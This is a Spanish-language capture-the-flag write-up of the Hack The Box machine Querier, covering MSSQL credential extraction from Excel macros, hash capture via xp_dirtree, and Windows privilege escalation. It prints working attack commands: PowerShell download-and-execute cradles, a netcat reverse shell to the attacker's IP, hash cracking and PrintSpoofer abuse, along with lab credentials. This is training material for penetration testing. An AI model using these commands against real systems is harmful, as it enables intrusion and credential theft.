---
layout: single
title: Hack The Box - Querier 
excerpt: "Es una máquina Easy de Hack The Box donde se obtiene un archivo Excel con macros que debe analizarse para identificar credenciales útiles para MSSQL. A partir de ahí se aprovechó xp_dirtree para obtener un hash y elevar privilegios en MSSQL hasta lograr ejecución de comandos. La escalada de privilegios en el sistema puede realizarse por dos vías: (1) mediante enumeración con PowerUp para localizar credenciales del administrador, o (2) abusando del privilegio SeImpersonatePrivilege, que puede explotarse con herramientas como Juicy Potato o PrintSpoofer."
date: 2025-10-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-Querier/querier.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hack The Box
  - SMB
  - MSSQL
   
tags:  
  - xp_dirtree
  - 


---
<style>
  body {
    margin: 0;
    padding: 0;
    background-color: #0b101b;
    font-family: Arial, sans-serif;
    color: white;
  }

  /* Centramos únicamente los elementos visuales */
  .glitch,
  .title,
  .date,
  .info {
    text-align: center;
    margin-left: auto;
    margin-right: auto;
  }

  .glitch {
    position: relative;
    width: 90%;
    max-width: 400px;
    height: 300px;
    background-image: url("/assets/images/htb-writeup-Querier/querier.png");
    background-size: cover;
    background-position: center;
    margin: 2rem auto 1rem auto;
    overflow: hidden;
  }

  .glitch:before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url("/assets/images/htb-writeup-Querier/querier.png");
    background-size: cover;
    background-position: center;
    opacity: 0.5;
    mix-blend-mode: hard-light;
    animation: glitch2 10s linear infinite;
  }

  .glitch:hover:before {
    animation: glitch1 1s linear infinite;
  }

  @keyframes glitch1 {
    0% { background-position: 0 0; filter: hue-rotate(0deg); }
    10% { background-position: 5px 0; }
    20% { background-position: -5px 0; }
    30% { background-position: 15px 0; }
    40% { background-position: -5px 0; }
    50% { background-position: -25px 0; }
    60% { background-position: -50px 0; }
    70% { background-position: 0 -20px; }
    80% { background-position: -60px -20px; }
    81% { background-position: 0 0; }
    100% { background-position: 0 0; filter: hue-rotate(360deg); }
  }

  @keyframes glitch2 {
    0% { background-position: 0 0; filter: hue-rotate(0deg); }
    10% { background-position: 15px 0; }
    15% { background-position: -15px 0; }
    20% { filter: hue-rotate(360deg); }
    25% { background-position: 0 0; filter: hue-rotate(0deg); }
    100% { background-position: 0 0; filter: hue-rotate(0deg); }
  }

  .title {
    font-size: 1.5rem;
    font-weight: bold;
    margin-bottom: 0.5rem;
  }

  .date {
    font-size: 1rem;
    color: #ccc;
    margin-bottom: 1rem;
  }

  .info {
    display: flex;
    justify-content: center;
    gap: 2rem;
    flex-wrap: wrap;
    margin-top: 1rem;
    font-size: 0.9rem;
  }

  .info div {
    text-align: center;
  }

  .info .label {
    color: #999;
    font-size: 0.8rem;
  }

  .icon {
    font-size: 2rem;
    color: #0f0;
    margin: 0.5rem 0;
  }

  /* Responsive */
  @media (max-width: 575.5px) {
    .glitch {
      height: 200px;
    }
    .title {
      font-size: 1.3rem;
    }
  }
</style>

<body>
    <div class="glitch">  
    </div>
</body>

<br>

`Querier` es una máquina Easy de Hack The Box donde se obtiene un archivo Excel con macros que debe analizarse para identificar credenciales útiles para MSSQL. A partir de ahí se aprovechó xp_dirtree para obtener un hash y elevar privilegios en MSSQL hasta lograr ejecución de comandos. La escalada de privilegios en el sistema puede realizarse por dos vías: (1) mediante enumeración con PowerUp para localizar credenciales del administrador, o (2) abusando del privilegio SeImpersonatePrivilege, que puede explotarse con herramientas como Juicy Potato o PrintSpoofer.

## Enumeración

Realizando un escaneo de puertos TCP identifique los siguientes abiertos:

```bash
Nmap scan report for 10.10.10.125
Host is up, received user-set (0.22s latency).
Scanned at 2025-08-27 11:07:51 CST for 65s

PORT      STATE    SERVICE       REASON          VERSION
135/tcp   open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds? syn-ack ttl 127
1433/tcp  open     ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2017 14.00.1000
5985/tcp  open     http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open     http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp filtered unknown       no-response
49666/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
## Enumeración SMB

Primero ejecute netexec para obtener mas información de la maquina

```bash
┌──(root💀kali)-[/home/kali]
└─# nxc smb 10.10.10.125                                                                                                                             
SMB         10.10.10.125    445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)  
```
Con esto identifiqué que, el dominio de la maquina es `HTB.LOCAL`, posteriormente revise los recursos compartidos de la maquina con smbclient

```bash
┌──(root💀kali)-[/home/kali]
└─#  smbclient -L 10.10.10.125
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
El recurso compartido que llamo mi interés fue `Reports`, posteriormente. consulte los permisos que tenia en los recursos compartidos identificados con smbmap y netexec para tener certeza de que enumerar

```bash
root@kali# smbmap -H 10.10.10.125
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.125...
[+] IP: 10.10.10.125:445        Name: 10.10.10.125
        Disk                                                    Permissions
        ----                                                    -----------
[!] Access Denied

root@kali# smbmap -u invaliduser -H 10.10.10.125
[+] Finding open SMB ports.... 
[!] Authentication error occurred
[!] The NETBIOS connection with the remote host timed out.
[!] Authentication error on 10.10.10.125
```

```bash
┌──(root💀kali)-[/home/kali]
└─# nxc smb 10.10.10.125 -u '' -p '' --shares        
SMB         10.10.10.125    445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] HTB.LOCAL\: 
SMB         10.10.10.125    445    QUERIER          [-] Error enumerating shares: STATUS_ACCESS_DENIED


──(root💀kali)-[/home/kali]
└─# nxc smb 10.10.10.125 -u 'elperrin' -p '' --shares
SMB         10.10.10.125    445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [-] HTB.LOCAL\elperrin: STATUS_NO_LOGON_SERVERS 
```                                                                                                                                                            
El servicio estaba algo inestable ya que hasta la tercer ejecución funciono

```bash
──(root💀kali)-[/home/kali]
└─# smbmap -H 10.10.10.125 -u 'elperr1n'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.125:445        Name: 10.10.10.125              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        Reports                                                 READ ONLY
```
Ahora que veo que tengo permiso de lectura en `Reports` entre directamente con smbclient 

```bash
┌──(root💀kali)-[/home/kali]
└─# smbclient //10.10.10.125/Reports
Password for [WORKGROUP\root]:

Try "help" to get a list of possible commands.
smb: \> 
```
Dentro había un archivo excel mismo que descargue a mi equipo

```bash
smb: \> dir
  .                                   D        0  Mon Jan 28 17:23:48 2019
  ..                                  D        0  Mon Jan 28 17:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 16:21:34 2019

                5158399 blocks of size 4096. 847916 blocks available
smb: \> mget "Currency Volume Report.xlsm"
Get file Currency Volume Report.xlsm? y
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (9.7 KiloBytes/sec) (average 9.7 KiloBytes/sec)
```
Al abrir el excel en libreoffice hay un mensaje que indica que este documento contiene Macros 

![](/assets/images/htb-writeup-Querier/excel.png)

Para poder ver los macros use la herramienta olevba al ejecutarlo veo que hay credenciales de una conexión a una base de datos

```bash
──(root💀kali)-[/home/kali]
└─# olevba 'Currency Volume Report.xlsm'                                                                                                                127 ⨯
olevba 0.60.2 on Python 3.13.5 - http://decalage.info/python/oletools
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```
Con estas credenciales me pude conectar a MSSQL

```bash
┌──(root💀kali)-[/home/kali]
└─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py WORKGROUP/reporting@10.10.10.125 -windows-auth

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (QUERIER\reporting  reporting@volume)>
```
En este punto intente ejecutar comandos pero tuve un error así que intente habilitar el `xp_cmdshell` pero también obtuve un error

```bash
SQL (QUERIER\reporting  reporting@volume)>  xp_cmdshell "whoami"
ERROR(QUERIER): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (QUERIER\reporting  reporting@volume)> enable_xp_cmdshell
ERROR(QUERIER): Line 105: User does not have permission to perform this action.
ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
```
Para poder ejecutar comandos intente impersonar al usuario `sa` pero también tuve un error

```bash
SQL (QUERIER\reporting  reporting@volume)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
name   
----   
SQL (QUERIER\reporting  reporting@volume)>
```
En este punto probé otro vector de ataque con `xp_dirtree` para listar recursos compartidos a nivel de red de algún equipo y poder capturar un hash, primero levante un recurso compartido con impacket

```bash
SQL (QUERIER\reporting  reporting@volume)> exec xp_dirtree "\\10.10.16.8\smbFolder\"
subdirectory   depth   
------------   -----   
SQL (QUERIER\reporting  reporting@volume)>
```

```bash
┌──(root💀kali)-[/home/kali]
└─# python3 /usr/share/doc/python3-impacket/examples/smbserver.py smbFolder $(pwd) -smb2support                                                         130 ⨯
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.125,49675)
[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
[*] User QUERIER\mssql-svc authenticated successfully
[*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:815ea00dd2a44793b0de92da10b405a0:0101000000000000800010c38417dc0161adc86ef1c6b4e2000000000100100070004800730055005a004f00410042000300100070004800730055005a004f00410042000200100078004c007700720052006200550050000400100078004c0077007200520062005500500007000800800010c38417dc0106000400020000000800300030000000000000000000000000300000fb8dcb7c1fd638df43583be36d4126f93047fe34f509bc37f46213c3c46842150a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003800000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
[*] AUTHENTICATE_MESSAGE (\,QUERIER)
[*] User QUERIER\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:smbFolder)
[*] Closing down connection (10.10.10.125,49675)
[*] Remaining connections []
```
Al romper el hash pude encontrar la contraseña en claro del usuario

```bash
┌──(root💀kali)-[/home/kali]
└─# john hash --wordlist=/usr/share/wordlists/rockyou.txt                                                                                                 2 ⨯
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
1g 0:00:00:03 DONE (2025-08-27 13:06) 0.2710g/s 2428Kp/s 2428Kc/s 2428KC/s correforenz..cornamuckla
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```
Con estas credenciales intente conectarme mediante evil-winrm pero no funciono sin embargo me pude conectar por mssql

```bash
──(root💀kali)-[/home/kali]
└─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py WORKGROUP/mssql-svc@10.10.10.125 -windows-auth                                      130 ⨯

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (QUERIER\mssql-svc  dbo@master)>
```
En este punto, habilite xp_cmdshell y logre ejecutar comandos

```bash
SQL (QUERIER\mssql-svc  dbo@master)> enable_xp_cmdshell
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "whoami"
output              
-----------------   
querier\mssql-svc   

NULL                

SQL (QUERIER\mssql-svc  dbo@master)> 
```
Posteriormente para generar una reverse shell utilice el script Invoke-PowerShellTcp.ps1 agregando al final del archivo:

```bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.73 -Port 4443
```
Posteriormente coloque un servidor temporal donde tengo mi archivo **Invoke-PowerShellTcp.ps1** y en otra pestaña colocar un listener por el puerto 4443 finamente ejecute lo siguiente desde MSSQL

```bash
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.16.8/IPTCP.ps1\")"
```

```bash
┌──(root💀kali)-[/opt]
└─# python3 -m http.server 80                                                                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.125 - - [27/Aug/2025 13:38:35] "GET /IPTCP.ps1 HTTP/1.1" 200 -
```

```bash
┌──(root💀kali)-[/home/kali]
└─# rlwrap nc -lvp 443
listening on [any] 443 ...
10.10.10.125: inverse host lookup failed: Unknown host
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.125] 49677
Windows PowerShell running as user mssql-svc on QUERIER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
querier\mssql-svc
PS C:\Windows\system32> 
```
## Escalada de privilegios

## Método 1

Para escalar privilegios utilice el script PowerUp.ps1 para enumerar al sistema, primero agregue la siguiente linea al final del script

```bash
Invoke-AllChecks
```
Después coloque un servidor temporal con python y desde la maquina windows con IEX llame el script para que realizara la enumeración.

```bash
┌──(root💀kali)-[/home/kali/Downloads]
└─# python3 -m http.server 80                                                                                                                           130 ⨯
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.125 - - [27/Aug/2025 14:50:00] "GET /PowerUp.ps1 HTTP/1.1" 200 -
```

```bash
PS C:\users\mssql-svc\desktop> 
PS C:\users\mssql-svc\desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.8/PowerUp.ps1')


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2748
ProcessId   : 3968
Name        : 3968
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```
Mediante esta enumeración se ve una credenciales en claro para el usuario administrador así que inicie sesión con evil-winrm

```bash
┌──(root💀kali)-[/home/kali]
└─# evil-winrm -i 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
querier\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
## Método 2

Otra manera de escalar privilegios es abusando del privilegio `SeImpersonatePrivilege` el cual se encuentra habilitado

```bash
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
podría utilizarse Juicy Potato para escalar privilegios pero también puede usarse `PrintSpoofer`, lo primero fue compartir `netcat.exe` y `PrintSpoofer.exe` a la maquina victima, esto lo hice creando un recurso compartido 

```bash
C:\Users\mssql-svc\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 35CB-DA81

 Directory of C:\Users\mssql-svc\Desktop

08/27/2025  10:38 PM    <DIR>          .
08/27/2025  10:38 PM    <DIR>          ..
08/27/2025  09:38 PM            59,392 nc.exe
08/27/2025  10:38 PM            27,136 PrintSpoofer64.exe
08/27/2025  04:32 PM                34 user.txt
               4 File(s)        434,210 bytes
               2 Dir(s)   3,147,378,688 bytes free

C:\Users\mssql-svc\Desktop>
```
Posteriormente me envié una shell con netcat desde la conexión previa a MSSQL ya que para que funcione la explotación no debe tenerse una sesión en powershell 

```bash
┌──(root💀kali)-[/home/kali/Downloads]
└─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py WORKGROUP/mssql-svc@10.10.10.125 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (QUERIER\mssql-svc  dbo@master)> enable_xp_cmdshell
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\mssql-svc  dbo@master)> EXEC xp_cmdshell '\users\mssql-svc\desktop\nc.exe 10.10.16.8 4443 -e cmd.exe'
```
```bash
┌──(root💀kali)-[/home/kali]
└─# nc -lvp 4443
listening on [any] 4443 ...
10.10.10.125: inverse host lookup failed: Unknown host
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.125] 49695
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
Posteriormente, para lograr la explotación ejecute: 

```bash
PrintSpoofer64.exe -i -c powershell.exe
```

```bash
C:\Users\mssql-svc\Desktop>whoami
whoami
querier\mssql-svc

C:\Users\mssql-svc\Desktop>PrintSpoofer64.exe -i -c powershell.exe
PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32>
```
`NOTA:` Esta explotación funciono porque se tenia un servicio de red y el privilegio  SeImpersonatePrivilege habilitado. 

